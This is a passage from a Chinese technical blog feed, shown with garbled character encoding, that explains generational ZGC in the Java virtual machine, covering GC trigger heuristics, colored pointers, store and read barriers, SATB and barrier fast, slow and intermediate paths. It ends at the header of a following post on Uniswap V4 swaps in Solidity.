<p>è¿›è¡ŒMinor GCæ—¶ï¼ŒGCçº¿ç¨‹ç›´æ¥æ‰«æ<strong>RemSet Bitmapï¼ˆè®°å¿†é›†ä½å›¾ï¼‰</strong> ä¸­è®¾ç½®ä¸º1çš„ä½ï¼Œç›´æ¥æ ¹æ®ä½å›¾å®šä½åˆ°å†…å­˜åœ°å€ï¼Œè¯»å–æŒ‡é’ˆï¼Œå°†å…¶æŒ‡å‘çš„å¹´è½»ä»£å¯¹è±¡<strong>æ ‡è®°ä¸ºå­˜æ´»</strong>ã€‚</p>
<p>ä¸” ZGC å€¾å‘äºæ›´å¿«åœ°è®©å¯¹è±¡æ™‹å‡,è¢«è€å¹´ä»£å¼•ç”¨çš„è¿™ä¸ªå¹´è½»ä»£å¯¹è±¡åªä¼šç»è¿‡è¾ƒå°‘æ¬¡æ•°çš„æ ‡è®°å°±èƒ½å¾—åˆ°æ™‹å‡ï¼Œä»è€Œæ¶ˆé™¤è·¨ä»£å¼•ç”¨ï¼Œå‡å°‘ RSet çš„è´Ÿæ‹…ã€‚</p>
<h4 data-id="heading-27">GCè§¦å‘æ—¶æœº</h4>
<p>åœ¨åˆ†ä»£ ZGC ä¸­ï¼Œ<strong>Major GC å’Œ Minor GC æ˜¯å®Œå…¨ç‹¬ç«‹çš„</strong>ï¼Œä¸”ä¹Ÿéƒ½æ˜¯å¯ä»¥ä¸åº”ç”¨çº¿ç¨‹å¹¶å‘æ‰§è¡Œçš„ï¼Œç”šè‡³Major GCä¸Minor GCä¹‹é—´ä¹Ÿå¯ä»¥å¹¶å‘æ‰§è¡Œ</p>
<ul>
<li><strong>Minor GC</strong>ï¼š
<ul>
<li><strong>è§¦å‘</strong>ï¼šEden åŒºæ»¡äº†å°±è§¦å‘ã€‚</li>
<li><strong>è¡Œä¸º</strong>ï¼šåªå›æ”¶å¹´è½»ä»£ã€‚</li>
</ul>
</li>
<li><strong>Major GC</strong>ï¼š
<ul>
<li><strong>è§¦å‘</strong>ï¼šç»§æ‰¿äº† ä¸åˆ†ä»£ZGC æ ¸å¿ƒçš„â€œ<strong>è‡ªé€‚åº”é¢„æµ‹</strong>â€ï¼Œä½†å…¶ç›‘æ§çš„æ ¸å¿ƒæŒ‡æ ‡ä»â€œ<strong>å†…å­˜åˆ†é…é€Ÿç‡</strong>â€å˜æˆäº†â€œ<strong>å¯¹è±¡æ™‹å‡é€Ÿç‡</strong>â€ã€‚</li>
<li><strong>è¡Œä¸º</strong>ï¼š<strong>åªå›æ”¶è€å¹´ä»£</strong>ï¼ˆè¿™ä¸ G1 Mixed GC ä¸åŒï¼‰ã€‚</li>
<li><strong>å¹¶å‘æ€§</strong>ï¼šMajor GC è¿è¡Œæ—¶ï¼Œåº”ç”¨çº¿ç¨‹ä¾ç„¶å¯ä»¥åˆ†é…å¯¹è±¡ï¼ˆåœ¨å¹´è½»ä»£ï¼‰ï¼Œç”šè‡³å¯èƒ½åœ¨ Major GC è¿›è¡Œçš„è¿‡ç¨‹ä¸­ï¼Œç©¿æ’å‘ç”Ÿå¤šæ¬¡ Minor GCã€‚[</li>
</ul>
</li>
</ul>
<p>Major GCé€šè¿‡é¢„æµ‹<strong>å¯¹è±¡æ™‹å‡é€Ÿç‡</strong>æ¥å†³å®šè§¦å‘ï¼š</p>
<ol>
<li><strong>æ™‹å‡é€Ÿç‡ (Promotion Rate)</strong>ï¼š
<ul>
<li>Minor GC ç»“æŸåï¼Œæœ‰å¤šå°‘å¯¹è±¡å­˜æ´»å¹¶è¢«ç§»åŠ¨åˆ°äº†è€å¹´ä»£ã€‚</li>
<li>ZGC ä¼šè®¡ç®—è¿™ä¸ªé€Ÿç‡çš„å¹³å‡å€¼å’Œå³°å€¼ã€‚</li>
</ul>
</li>
<li><strong>è€å¹´ä»£å›æ”¶è€—æ—¶ (Old GC Duration)</strong>ï¼š
<ul>
<li>åŸºäºå†å²æ•°æ®ï¼Œé¢„æµ‹å®Œæˆä¸€è½®è€å¹´ä»£å¹¶å‘æ ‡è®°å’Œå¹¶å‘è½¬ç§»<strong>éœ€è¦å¤šå°‘æ—¶é—´</strong>ã€‚</li>
</ul>
</li>
</ol>
<p><strong>è§¦å‘å…¬å¼é€»è¾‘</strong>ï¼š
<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mtext>è€å¹´ä»£å †æ»¡çš„æ—¶é—´</mtext></msub><mo>&lt;</mo><msub><mi>T</mi><mtext>è€å¹´ä»£å›æ”¶è€—æ—¶</mtext></msub><mo>+</mo><mtext>å®‰å…¨ç¼“å†²æ—¶é—´</mtext></mrow><annotation encoding="application/x-tex">T_{\text{è€å¹´ä»£å †æ»¡çš„æ—¶é—´}} &lt; T_{\text{è€å¹´ä»£å›æ”¶è€—æ—¶}} + \text{å®‰å…¨ç¼“å†²æ—¶é—´}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord text mtight"><span class="mord cjk_fallback mtight">è€å¹´ä»£å †æ»¡çš„æ—¶é—´</span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord text mtight"><span class="mord cjk_fallback mtight">è€å¹´ä»£å›æ”¶è€—æ—¶</span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord text"><span class="mord cjk_fallback">å®‰å…¨ç¼“å†²æ—¶é—´</span></span></span></span></span></span></p>
<p>å½“é¢„æµ‹åˆ°â€œ<strong>è€å¹´ä»£å‰©ä½™ç©ºé—´è¢«å¡«æ»¡çš„æ—¶é—´</strong>â€å¿«è¦å°äºâ€œ<strong>è€å¹´ä»£å›æ”¶æ‰€éœ€çš„æ—¶é—´</strong>â€æ—¶ï¼ŒZGC å°±ä¼šç«‹å³è§¦å‘ Major GC</p>
<hr/>
<p><strong>æ­¤å¤–ZGCè¿˜å¼•å…¥äº†ä¸¤ä¸ªæœºåˆ¶ï¼š</strong></p>
<ol>
<li>å…œåº•è§¦å‘è§„åˆ™ï¼šHigh Usage Rule (é«˜å ç”¨é˜ˆå€¼)</li>
</ol>
<p>å¦‚æœé¢„æµ‹æ¨¡å‹å¤±æ•ˆï¼ˆä¾‹å¦‚æµé‡æå…¶çªå‘ï¼Œæˆ–è€…å†å²æ•°æ®ä¸è¶³ï¼‰ï¼ŒZGC è¿˜æœ‰ä¸€ä¸ªä¿åº•æœºåˆ¶ã€‚</p>
<ul>
<li><strong>é€»è¾‘</strong>ï¼šå½“è€å¹´ä»£çš„å†…å­˜å ç”¨ç‡è¾¾åˆ°ä¸€ä¸ª<strong>å›ºå®šé˜ˆå€¼</strong>æ—¶ï¼Œå¼ºåˆ¶è§¦å‘ Major GCã€‚</li>
<li><strong>åŠ¨æ€è°ƒæ•´</strong>ï¼šè¿™ä¸ªé˜ˆå€¼ä¸æ˜¯å›ºå®šçš„ã€‚ZGC ä¼šæ ¹æ®å †çš„å¤§å°å’Œå†å² GC çš„æ•ˆç‡åŠ¨æ€è°ƒæ•´è¿™ä¸ªé˜ˆå€¼ï¼Œé€šå¸¸ä¼šåœ¨è€å¹´ä»£å ç”¨è¾ƒé«˜æ—¶ï¼ˆä¾‹å¦‚ 75% æˆ–æ›´é«˜ï¼Œå…·ä½“å–å†³äº<strong>å¯å‘å¼ç®—æ³•</strong>ï¼‰å¼ºåˆ¶ä»‹å…¥ã€‚</li>
</ul>
<ol start="2">
<li>ä¸»åŠ¨è§¦å‘è§„åˆ™ï¼šProactive Rule (ä¸»åŠ¨å›æ”¶)</li>
</ol>
<p>å¦‚æœç³»ç»Ÿå½“å‰æ¯”è¾ƒç©ºé—²ï¼ˆæ™‹å‡é€Ÿç‡å¾ˆä½ï¼‰ï¼Œè€å¹´ä»£å¯èƒ½å¾ˆä¹…éƒ½ä¸ä¼šæ»¡ã€‚ä¸ºäº†é¿å…åƒåœ¾é•¿æœŸå †ç§¯å¯¼è‡´å†…å­˜æµªè´¹ï¼ŒZGC ä¼šåœ¨ç³»ç»Ÿè´Ÿè½½è¾ƒä½æ—¶â€œä¸»åŠ¨â€å‘èµ·ä¸€æ¬¡ Major GCã€‚</p>
<h3 data-id="heading-28">æŸ“è‰²æŒ‡é’ˆä¼˜åŒ–</h3>
<p><strong>ä¸åˆ†ä»£ZGC</strong>ä½¿ç”¨<strong>å¤šé‡æ˜ å°„ï¼ˆMulti-Mappingï¼‰</strong>ï¼Œå³å°†å¤šæ®µè™šæ‹Ÿå†…å­˜æ˜ å°„åˆ°åŒä¸€æ®µç‰©ç†å†…å­˜ï¼ˆ3ä¸ªè¯†è§†å›¾M0ã€M1ã€Remappedï¼Œè¿™3ç§æ˜¯ä¸åŒçš„å †å†…å­˜æŒ‡é’ˆï¼‰ï¼Œè¿™ç§æŠ€å·§éå¸¸æ¶ˆè€—æ–‡ä»¶æè¿°ç¬¦å’Œå†…å­˜æ˜ å°„è¡¨ï¼Œä¸”ä¸ä»…é™åˆ¶äº†å †å¤§å°ï¼ˆæœ€å¤§ 16TBï¼‰ï¼Œè¿˜è®©å…ƒæ•°æ®ç®¡ç†å¾ˆéº»çƒ¦ã€‚</p>
<blockquote>
<p>è€Œä¸”æ“ä½œç³»ç»Ÿå¯èƒ½è¿˜ä¼šé”™è¯¯åœ°é€šæŠ¥å†…å­˜ä½¿ç”¨é‡ï¼Œæ˜¾ç¤ºçš„å†…å­˜å ç”¨æ˜¯å®é™…çš„3å€ï¼Œè€Œä¸”å› ä¸ºè™šæ‹Ÿåœ°å€çš„ä¸åŒï¼Œå¯¹äºLinuxç³»ç»Ÿè€Œè¨€ï¼Œè¿˜ä¼šå ç”¨æ›´å¤šçš„é¡µè¡¨ç¼“å­˜ <strong>TLB(Translation Lookaside Buffer)</strong> ï¼Œè€Œä¸”æ¯æ¬¡éƒ½è¦è¿›è¡Œåˆ‡æ¢</p>
</blockquote>
<p><strong>åˆ†ä»£ZGC</strong>æŠ›å¼ƒäº†å¤šé‡æ˜ å°„ï¼Œä½¿ç”¨æ–°çš„<strong>æŸ“è‰²æŒ‡é’ˆ</strong>æ•°æ®ç»“æ„ï¼Œå®ƒç›´æ¥åœ¨ 64 ä½æŒ‡é’ˆçš„<strong>ä½ä½</strong>ï¼ˆä¸å†æ˜¯é«˜ä½ï¼‰å­˜å‚¨å…ƒæ•°æ®ï¼ˆé¢œè‰²ä½ï¼‰ï¼Œä¸”ä¼˜åŒ–äº†å±éšœä»£ç ï¼Œåœ¨<strong>è¯»å†™å±éšœ</strong>ä¸­ç›´æ¥å¤„ç†è¿™äº›é¢œè‰²ä½ï¼Œè€Œä¸å†ä¾èµ–æ“ä½œç³»ç»Ÿå±‚é¢çš„è™šæ‹Ÿåœ°å€åˆ«åï¼ŒæŒ‡ä»¤æ•°æ›´å°‘ï¼Œå±éšœæŒ‡ä»¤æ›´å¿«ã€‚</p>
<h4 data-id="heading-29">æ˜¾å¼çš„å…ƒæ•°æ®</h4>
<p>ä¸åŒäº<strong>ä¸åˆ†ä»£ZGC</strong>çš„<strong>å¤šé‡æ˜ å°„</strong>ï¼ˆé€šè¿‡æ“ä½œç³»ç»Ÿè™šæ‹Ÿåœ°å€åˆ«åå®ç°çš„ï¼‰ï¼Œæ“ä½œç³»ç»Ÿâ€œéšå¼â€åœ°è§£å†³äº†åœ°å€è½¬æ¢é—®é¢˜ï¼Œåªéœ€è¦è®¿é—®å¯¹åº”çš„è™šæ‹Ÿåœ°å€å°±è¡Œã€‚</p>
<p>åœ¨<strong>åˆ†ä»£ZGC</strong>ä¸­ï¼Œä¾ç„¶åˆ©ç”¨æŒ‡é’ˆå­˜å‚¨é¢œè‰²ä¿¡æ¯ï¼Œä½†<strong>ä¸å†ä¾èµ–æ“ä½œç³»ç»Ÿæ˜ å°„</strong>ï¼ŒZGC çš„ <strong>JIT ç¼–è¯‘å™¨</strong>ä¼šåœ¨æ¯æ¬¡è®¿é—®å†…å­˜å‰ï¼Œæ’å…¥ä¸€æ¡<strong>ä½è¿ç®—æŒ‡ä»¤</strong>ï¼Œ<strong>æ¶ˆé™¤é¢œè‰²ä½</strong>ï¼Œè¿˜åŸæˆçº¯å‡€çš„å†…å­˜åœ°å€ï¼Œç„¶åå†äº¤ç»™ CPU å»è®¿é—®ï¼Œéœ€è¦å¯¹å…ƒæ•°æ®è¿›è¡Œâ€œ<strong>æ˜¾å¼</strong>â€åœ°è¯»å–å’Œå¤„ç†ï¼Œè¿™æ ·å°±æ²¡æœ‰å¤šé‡æ˜ å°„é‚£äº›é—®é¢˜äº†ã€‚</p>
<blockquote>
<p>è¿™ä¸ªæ¶ˆé™¤é¢œè‰²ä½çš„æŒ‡ä»¤æ˜¯ä¸€ä¸ªä½è¿ç®—ï¼ŒCPUè¿è¡Œä½è¿ç®—æŒ‡ä»¤çš„é€Ÿåº¦æå¿«ï¼ŒåŸºæœ¬éƒ½å¯ä»¥å¿½ç•¥</p>
</blockquote>
<p>å¯¹äºå†™å±éšœï¼Œå¤„ç†çš„é€»è¾‘å’Œä¸åˆ†ä»£ZGCç›¸åŒï¼Œå°±æ˜¯æŸ¥çœ‹æŒ‡é’ˆçš„é¢œè‰²æ˜¯å¦ä¸ºå½“å‰å†…å­˜è¯†å›¾çš„é¢œè‰²ï¼Œå¦‚æœæ˜¯å°±ç›´æ¥æ”¾è¡Œï¼Œå¦‚æœä¸æ˜¯å°±è¿›è¡Œä¸€ç³»åˆ—å¤„ç†</p>
<h3 data-id="heading-30">å†…å­˜å±éšœä¼˜åŒ–</h3>
<h4 data-id="heading-31">å¼•å…¥å†™å±éšœ</h4>
<p>åˆ†ä»£ZGCè¿˜å¼•å…¥äº†<strong>å†™å±éšœ(Store Barrier)</strong>ï¼Œä¸Šæ–‡å·²ç»æè¿°ï¼Œç”¨äºè§£å†³è·¨ä»£å¼•ç”¨çš„ç›¸å…³é—®é¢˜ã€‚</p>
<p>åŒæ—¶ï¼Œå†™å±éšœè¿˜æœ‰ä»¥ä¸‹çš„åŠŸèƒ½ï¼š</p>
<p><strong>è‡ªæ„ˆ</strong>ï¼šå½“åˆ›å»ºäº†ä¸€ä¸ªå¼•ç”¨æ—¶ï¼Œå†™å±éšœä»‹å…¥ï¼Œå†™å±éšœä¼šå¸®å¿™å°†è¯¥å¯¹è±¡æ ‡è®°ä¸º<strong>å­˜æ´»</strong>ï¼Œå°†å½“å‰æŒ‡é’ˆä¿®æ”¹ä¸ºå½“å‰è§†å›¾çš„æ­£ç¡®é¢œè‰²ã€‚
<em>æ³¨æ„ï¼šæ¯”å¦‚æ‰§è¡Œ<code>obj.field = var</code>æ—¶ï¼Œå˜é‡<code>val</code>å¯èƒ½æ¥è‡ªå¯„å­˜å™¨æˆ–æ ˆï¼Œå®ƒçš„æŒ‡é’ˆé¢œè‰²å¯èƒ½æ˜¯â€œåâ€çš„ï¼ˆä¾‹å¦‚æŒ‡å‘æ—§åœ°å€ï¼Œæˆ–è€…é¢œè‰²ä½æ˜¯ä¸Šä¸€è½® GC çš„ï¼‰ï¼Œæ­¤æ—¶å†™æŒ‡é’ˆè¿˜æœ‰â€œä¿®å¤æŒ‡é’ˆé¢œè‰²â€ï¼Œæˆ–è€…â€œæŸ¥æ‰¾è½¬å‘è¡¨è®¾ç½®ä¸ºæ­£ç¡®çš„åœ°å€â€çš„åŠŸèƒ½</em></p>
<p><strong>SATB æ ‡è®°å±éšœ</strong>ï¼šè¿™ä¹Ÿæ˜¯å†™å±éšœå†…éƒ¨çš„ä¸€æ®µé€»è¾‘ä»£ç ï¼Œç±»ä¼¼äºG1çš„SATBï¼ŒGC æµç¨‹å¼€å§‹æ—¶ï¼Œé€»è¾‘ä¸Šè®¤ä¸ºå †æ˜¯ä¸€ä¸ªé™æ€å¿«ç…§ã€‚å½“æ‰§è¡Œ<code>obj.field = var</code>æ—¶ï¼Œzgcä¼šå°†<code>obj.field</code>å¼•ç”¨çš„åŸæ¥çš„å¯¹è±¡æ”¾å…¥ SATB ç¼“å†²åŒºï¼ŒGCçº¿ç¨‹ä¼šæ‰«æè¿™ä¸ªç¼“å†²åŒºï¼ŒæŠŠæ—§çš„é‚£ä¸ªå¯¹è±¡æ ‡è®°ä¸ºå­˜æ´»ï¼›ä¸‹ä¸€å°èŠ‚ä¼šè¯¦ç»†æè¿°ä¸‹ã€‚</p>
<h4 data-id="heading-32">è½»é‡è¯»å±éšœ</h4>
<p>ä¼—æ‰€å‘¨çŸ¥ï¼Œä¸€ä¸ªç³»ç»Ÿä¸­<strong>è¯»æ“ä½œ</strong>ä¸€èˆ¬è¿œå¤§äºå†™æ“ä½œï¼Œä¸åˆ†ä»£zgcå¼•å…¥äº†è¯»å±éšœï¼Œå¯¼è‡´è¿›è¡Œè¯»æ“ä½œæ—¶è¿˜éœ€è¦æ‰§è¡Œä¸€æ®µè¯»å±éšœä»£ç ï¼Œæ‰€ä»¥ä¸€èˆ¬æƒ…å†µä¸‹ä¸åˆ†ä»£ZGCçš„<strong>ååé‡</strong>ä¼šå°äºG1</p>
<p>ä¸€æ–¹é¢åŸå› æ˜¯<strong>ä¸åˆ†ä»£zgc</strong>çš„è¯»å±éšœ<strong>èŒè´£è¿‡é‡</strong>ï¼Œä¸ä»…è¦è¿›è¡Œé‡å®šä½çš„æ“ä½œï¼ˆæŸ¥è¯¢è½¬å‘è¡¨ä¿®æ”¹ä¸ºæ­£ç¡®çš„åœ°å€ï¼‰ï¼Œè¿˜è¦è¿›è¡Œæ ‡è®°çš„å·¥ä½œï¼ˆå¹¶å‘æ ‡è®°é˜¶æ®µè¯»å±éšœä¼šå¸®åŠ©gcçº¿ç¨‹è¿›è¡Œæ ‡è®°ä»»åŠ¡ï¼‰</p>
<p><strong>åˆ†ä»£ZGC</strong>è¿›è¡Œäº†ä¸€äº›ä¼˜åŒ–ï¼Œè®©è¯»å±éšœä¸»è¦å°±è¿›è¡Œ<strong>é‡å®šä½</strong>å’Œ<strong>åˆ†ä»£çŠ¶æ€æ£€æŸ¥</strong>çš„å·¥ä½œï¼Œç„¶åé€šè¿‡<strong>å†™å±éšœ</strong>å’Œ<strong>SATB(Snapshot-At-The-Beginning)</strong> ç®—æ³•ï¼Œå°†æ ‡è®°ä»»åŠ¡å½»åº•è½¬ç§»ç»™äº†å†™å±éšœå’Œåå°çš„å¹¶å‘æ ‡è®°çº¿ç¨‹</p>
<p>å·¥ä½œæ–¹å¼å’ŒG1çš„ç›¸ä¼¼ï¼Œå³å°†æ–­å¼€çš„å¼•ç”¨å¯¹è±¡æ”¾å…¥SATB ç¼“å†²åŒºï¼ŒGCçº¿ç¨‹ä¼šæ‰«æè¿™ä¸ªç¼“å†²åŒºï¼ŒæŠŠæ—§çš„é‚£ä¸ªå¯¹è±¡æ ‡è®°ä¸ºå­˜æ´»ï¼Œç„¶å<strong>ä¸‹ä¸€è½®GCå†è¿›è¡Œå¤„ç†</strong> ï¼Œä¼šäº§ç”Ÿæµ®åŠ¨åƒåœ¾ï¼Œä½†è‡³å°‘ä¸ä¼šè¯¯æ¸…ç†å­˜æ´»çš„å¯¹è±¡</p>
<p>è¿™æ ·åšï¼Œæœ‰æ•ˆåœ°æé«˜äº†ç³»ç»Ÿçš„<strong>ååé‡</strong></p>
<h4 data-id="heading-33">æ€§èƒ½ä¼˜åŒ–</h4>
<h5 data-id="heading-34">å¿«æ…¢è·¯å¾„</h5>
<p>åœ¨<strong>åˆ†ä»£ ZGC</strong> ä¸­ï¼Œå› ä¸ºè¦ç»´æŠ¤ RSetï¼Œåº”ç”¨çº¿ç¨‹æ¯æ¬¡ä¿®æ”¹è€å¹´ä»£å¯¹è±¡çš„å¼•ç”¨æ—¶ï¼Œéƒ½å¿…é¡»è§¦å‘<strong>å†™å±éšœ</strong>ã€‚å¦‚æœæ¯æ¬¡å†™æ“ä½œéƒ½ç›´æ¥è°ƒç”¨ C++ ä»£ç å»æ›´æ–°ä½å›¾ï¼Œæ€§èƒ½ä¼šæ‹‰èƒ¯ã€‚</p>
<p>æ‰€ä»¥ï¼ŒZGC è®¾è®¡äº† <strong>å¿«è·¯å¾„ï¼ˆFast Pathï¼‰</strong> å’Œ <strong>æ…¢è·¯å¾„ï¼ˆSlow Pathï¼‰</strong> çš„å±‚çº§ç»“æ„ã€‚</p>
<p>å¿«è·¯å¾„æ£€æµ‹æ˜¯å¦<strong>éœ€è¦é¢å¤–çš„ GC å·¥ä½œ</strong>ï¼Œå½“éœ€è¦æ—¶ï¼Œä¼šè·³è½¬è¿›å…¥<strong>æ…¢è·¯å¾„</strong>ï¼Œå¼€å§‹ç›¸å…³å·¥ä½œã€‚å¿«è·¯å¾„ç”± JIT å®ç°ï¼Œä¼šåœ¨ç¼–è¯‘æ—¶ç›´æ¥å°†GCä»£ç æ’å…¥åˆ°å±éšœçš„ä½ç½®ï¼Œè€Œæ— é¡»è¿›è¡Œå‡½æ•°è°ƒç”¨ã€‚è€Œæ…¢è·¯å¾„ä¸ç»å¸¸è°ƒç”¨ï¼Œæ‰€ä»¥ä½¿ç”¨ C++ å®ç°ã€‚</p>
<h5 data-id="heading-35">å†™å±éšœç¼“å†²è¿™ï¼ˆä¸­é—´è·¯å¾„ï¼‰</h5>
<p>é€šè¿‡å¼•å…¥å¿«è·¯å¾„ï¼Œå¹¶ä¸”ç»“åˆæŸ“è‰²æŒ‡é’ˆæŠ€æœ¯ï¼Œå¯ä»¥æœ‰æ•ˆå‡å°‘å¯¹ C++ æ…¢è·¯å¾„å‡½æ•°çš„è°ƒç”¨æ¬¡æ•°ã€‚é™¤äº†<strong>å¿«è·¯å¾„</strong>å’Œ<strong>æ…¢è·¯å¾„</strong>ï¼Œåˆ†ä»£ ZGC è¿˜è¿›ä¸€æ­¥å¯¹<strong>å†™å±éšœ</strong>åŠ å…¥ JIT ç¼–è¯‘çš„<strong>ä¸­é—´è·¯å¾„</strong></p>
<p>å¦‚æœå¿«è·¯å¾„æ£€æŸ¥é€šè¿‡ï¼Œè¯´æ˜éœ€è¦è®°å½• RSetã€‚ä½†å¦‚æœ<strong>ç«‹åˆ»å»æ›´æ–°</strong>é‚£ä¸ªå¤æ‚çš„â€œåŒé‡ä½å›¾â€ï¼Œæˆ–è€…è°ƒç”¨ C++ å‡½æ•°ï¼Œå¼€é”€å¤ªå¤§ï¼ˆéœ€è¦å¯„å­˜å™¨ä¿å­˜ã€æ ˆåˆ‡æ¢ç­‰æ“ä½œï¼‰ã€‚</p>
<p>ä¸­é—´è·¯å¾„å°†<strong>å¾…è¦†ç›–çš„å€¼</strong>å’Œ<strong>å¯¹è±¡å­—æ®µçš„åœ°å€</strong>å­˜å‚¨åœ¨<strong>å†™å±éšœç¼“å†²åŒº</strong>ä¸­,éšå<strong>ç›´æ¥è¿”å›</strong>è‡³å·²ç¼–è¯‘çš„åº”ç”¨ç¨‹åºä»£ç ï¼Œä»è€Œé¿å¼€äº†æ˜‚è´µçš„æ…¢è·¯å¾„ã€‚åªæœ‰å½“å†™å±éšœç¼“å†²åŒº<strong>å¡«æ»¡</strong>æ—¶ï¼Œæ‰ä¼šè§¦å‘æ…¢è·¯å¾„ã€‚è¿™ç§æœºåˆ¶åˆ†æ‘Šäº†ä»å·²ç¼–è¯‘åº”ç”¨ä»£ç åˆ‡æ¢åˆ° C++ æ…¢è·¯å¾„ä»£ç æ‰€äº§ç”Ÿçš„æ€§èƒ½æŸè€—ã€‚</p>
<h2 data-id="heading-36">å‚è€ƒæ–‡çŒ®</h2>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwiki.openjdk.org%2Fspaces%2Fzgc%2Fpages%2F34668579%2FMain" target="_blank" title="https://wiki.openjdk.org/spaces/zgc/pages/34668579/Main" ref="nofollow noopener noreferrer">ZGC Wiki</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Ftech.meituan.com%2F2020%2F08%2F06%2Fnew-zgc-practice-in-meituan.html" target="_blank" title="https://tech.meituan.com/2020/08/06/new-zgc-practice-in-meituan.html" ref="nofollow noopener noreferrer">æ–°ä¸€ä»£åƒåœ¾å›æ”¶å™¨ZGCçš„æ¢ç´¢ä¸å®è·µ</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fopenjdk.org%2Fjeps%2F439" target="_blank" title="https://openjdk.org/jeps/439" ref="nofollow noopener noreferrer">JEP439</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[3åˆ†é’ŸSolidity: 15.9 DeFi - Uniswap V4 å…‘æ¢]]></title>    <link>https://juejin.cn/post/7599917711792930826</link>    <guid>https://juejin.cn/post/7599917711792930826</guid>    <pubDate>2026-01-27T16:04:16.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7599917711792930826" data-draft-id="7599852042530193418" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="3åˆ†é’ŸSolidity: 15.9 DeFi - Uniswap V4 å…‘æ¢"/> <meta itemprop="keywords" content="Solidity,web3,æ™ºèƒ½åˆçº¦"/> <meta itemprop="datePublished" content="2026-01-27T16:04:16.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Rockbean"/> <meta itemprop="url" content="https://juejin.cn/user/4054654615823560"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            3åˆ†é’ŸSolidity: 15.9 DeFi - Uniswap V4 å…‘æ¢
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4054654615823560/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Rockbean
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-27T16:04:16.000Z" title="Tue Jan 27 2026 16:04:16 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
